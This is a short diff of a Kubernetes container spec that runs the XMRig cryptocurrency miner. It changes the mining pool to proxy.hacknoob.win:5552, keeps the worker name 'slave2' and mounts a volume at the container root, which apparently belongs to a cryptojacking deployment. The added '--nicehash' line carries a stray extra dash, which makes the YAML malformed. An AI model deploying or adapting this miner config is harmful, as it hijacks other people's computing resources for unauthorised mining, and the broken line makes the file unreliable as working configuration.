@@ -20,11 +20,12 @@ spec:
     - -t
     - "4"
     - -o
-    - node.hacknoob.win:3333
+    - proxy.hacknoob.win:5552
     - -u
     - slave2
     - --cpu-no-yield
     - --randomx-1gb-pages
+    - - --nicehash
     volumeMounts:
     - name: xmrig-volume-2
       mountPath: /
